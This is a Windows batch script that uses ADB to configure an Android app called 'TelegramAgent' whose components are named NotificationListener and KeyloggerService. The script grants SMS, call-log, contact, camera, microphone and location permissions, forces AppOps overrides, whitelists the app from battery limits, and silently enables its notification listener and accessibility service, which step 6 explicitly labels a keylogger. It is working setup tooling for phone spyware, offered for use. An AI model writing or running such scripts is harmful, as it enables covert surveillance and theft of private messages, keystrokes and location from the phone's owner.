@echo off
setlocal EnableDelayedExpansion
set PKG=com.thunderx.telegramagent
set LISTENER=%PKG%/com.thunderx.telegramagent.NotificationListener
set ACCESSIBILITY=%PKG%/com.thunderx.telegramagent.KeyloggerService

title TelegramAgent - Ultimate ADB Setup

echo ========================================================
echo   TelegramAgent - ULTIMATE Permission Setup
echo   Target: Android 14 - 16 (Honor/Xiaomi/Samsung)
echo ========================================================
echo.

REM ============================================================
REM   [0] Check ADB Device
REM ============================================================
echo [0/7] Checking ADB connection...
adb get-state 1>nul 2>&1
if errorlevel 1 (
    echo   [ERROR] No device found!
    echo   - Connect USB cable
    echo   - Enable USB Debugging in Developer Options
    pause
    exit /b 1
)
echo   OK - Device connected.
echo.

REM ============================================================
REM   [1] Verify App Installation
REM ============================================================
echo [1/7] Verifying package...
adb shell pm list packages 2>nul | findstr /C:"%PKG%" >nul
if errorlevel 1 (
    echo   [ERROR] %PKG% is NOT installed!
    pause
    exit /b 1
)
echo   OK - App is installed.
echo.

REM ============================================================
REM   [2] Grant Runtime Permissions
REM ============================================================
echo [2/7] Granting Runtime Permissions (pm grant)...
set GOK=0
set GFAIL=0

REM We only request permissions that are actually defined in your Manifest
for %%P in (
  android.permission.READ_CONTACTS
  android.permission.READ_CALL_LOG
  android.permission.READ_SMS
  android.permission.SEND_SMS
  android.permission.CAMERA
  android.permission.RECORD_AUDIO
  android.permission.ACCESS_FINE_LOCATION
  android.permission.ACCESS_COARSE_LOCATION
  android.permission.POST_NOTIFICATIONS
  android.permission.READ_EXTERNAL_STORAGE
  android.permission.WRITE_EXTERNAL_STORAGE
) do (
  adb shell pm grant %PKG% %%P >nul 2>&1
  if !errorlevel! equ 0 (
    set /a GOK+=1
  ) else (
    set /a GFAIL+=1
  )
)
echo   Granted: !GOK! ^| Failed/Skipped: !GFAIL!
echo.

REM ============================================================
REM   [3] Set AppOps (Crucial for restricted permissions)
REM ============================================================
echo [3/7] Setting AppOps (System level overrides)...
set OOK=0
set OFAIL=0
for %%O in (
  MANAGE_EXTERNAL_STORAGE
  READ_EXTERNAL_STORAGE
  WRITE_EXTERNAL_STORAGE
  READ_MEDIA_IMAGES
  READ_MEDIA_VIDEO
  READ_MEDIA_AUDIO
  CAMERA
  RECORD_AUDIO
  FINE_LOCATION
  COARSE_LOCATION
  READ_CONTACTS
  READ_CALL_LOG
  READ_SMS
  SEND_SMS
  SYSTEM_ALERT_WINDOW
  GET_USAGE_STATS
  PACKAGE_USAGE_STATS
  WRITE_SETTINGS
  VIBRATE
  WAKE_LOCK
  START_FOREGROUND
  RUN_IN_BACKGROUND
  RUN_ANY_IN_BACKGROUND
  BOOT_COMPLETED
  POST_NOTIFICATION
  SCHEDULE_EXACT_ALARM
  ACCESS_RESTRICTED_SETTINGS
  READ_NOTIFICATION
) do (
  adb shell appops set %PKG% %%O allow >nul 2>&1
  if !errorlevel! equ 0 (
    set /a OOK+=1
  ) else (
    set /a OFAIL+=1
  )
)
echo   Set: !OOK! ^| Failed/Skipped: !OFAIL!
echo.

REM ============================================================
REM   [4] Disable Battery Optimization (Honor/MagicOS Killer)
REM ============================================================
echo [4/7] Whitelisting from Battery Optimization...
adb shell dumpsys deviceidle whitelist +%PKG% >nul 2>&1
adb shell cmd deviceidle whitelist +%PKG% >nul 2>&1
adb shell cmd appops set %PKG% RUN_IN_BACKGROUND allow >nul 2>&1
adb shell cmd appops set %PKG% RUN_ANY_IN_BACKGROUND allow >nul 2>&1
echo   OK - App is now whitelisted and allowed to run in background.
echo.

REM ============================================================
REM   [5] Enable Notification Listener
REM ============================================================
echo [5/7] Enabling Notification Listener...
adb shell cmd notification allow_listener %LISTENER% >nul 2>&1
if !errorlevel! equ 0 (
    echo   OK - Notification Listener enabled via command.
    goto :accessibility
)

REM Fallback method if cmd fails
set EXISTING_LISTENERS=
for /f "delims=" %%L in ('adb shell settings get secure enabled_notification_listeners 2^>nul') do set EXISTING_LISTENERS=%%L
if "!EXISTING_LISTENERS!"=="null" set EXISTING_LISTENERS=
if "!EXISTING_LISTENERS!"=="" (
    set NEW_LISTENERS=%LISTENER%
) else (
    echo   !EXISTING_LISTENERS! | findstr /C:"%LISTENER%" >nul
    if !errorlevel! equ 0 (
        set NEW_LISTENERS=!EXISTING_LISTENERS!
    ) else (
        set NEW_LISTENERS=!EXISTING_LISTENERS!:%LISTENER%
    )
)
adb shell settings put secure enabled_notification_listeners "!NEW_LISTENERS!" >nul 2>&1
echo   OK - Notification Listener updated.
echo.

:accessibility
REM ============================================================
REM   [6] Enable Accessibility Service
REM ============================================================
echo [6/7] Enabling Accessibility Service (Keylogger)...
set EXISTING_ACC=
for /f "delims=" %%A in ('adb shell settings get secure enabled_accessibility_services 2^>nul') do set EXISTING_ACC=%%A
if "!EXISTING_ACC!"=="null" set EXISTING_ACC=
if "!EXISTING_ACC!"=="" (
    set NEW_ACC=%ACCESSIBILITY%
) else (
    echo   !EXISTING_ACC! | findstr /C:"%ACCESSIBILITY%" >nul
    if !errorlevel! equ 0 (
        set NEW_ACC=!EXISTING_ACC!
    ) else (
        set NEW_ACC=!EXISTING_ACC!:%ACCESSIBILITY%
    )
)
adb shell settings put secure enabled_accessibility_services "!NEW_ACC!" >nul 2>&1
adb shell settings put secure accessibility_enabled 1 >nul 2>&1
echo   OK - Accessibility Service enabled.
echo.

REM ============================================================
REM   [7] Restart App
REM ============================================================
echo [7/7] Restarting the App...
adb shell am force-stop %PKG% >nul 2>&1
adb shell am start -n %PKG%/.MainActivity >nul 2>&1
echo   OK - App restarted.
echo.

echo ========================================================
echo   ✅ DONE! ALL ADB SETTINGS APPLIED.
echo ========================================================
echo.
echo   ⚠️ IMPORTANT FOR HONOR / MAGIC OS USERS:
echo   Because your phone has a strict battery manager, you MUST 
echo   manually do these 2 things to prevent the app from dying:
echo.
echo   1. Settings -^> Apps -^> App Launch -^> Android-OS
echo      -^> Change "Auto-launch" to ON
echo      -^> Change "Run in background" to ON
echo.
echo   2. Settings -^> Battery -^> App launch -^> (Find App) 
echo      -^> Make sure it is set to "Manage manually" with all 3 toggles ON.
echo.
echo   Press any key to exit.
pause >nul
endlocal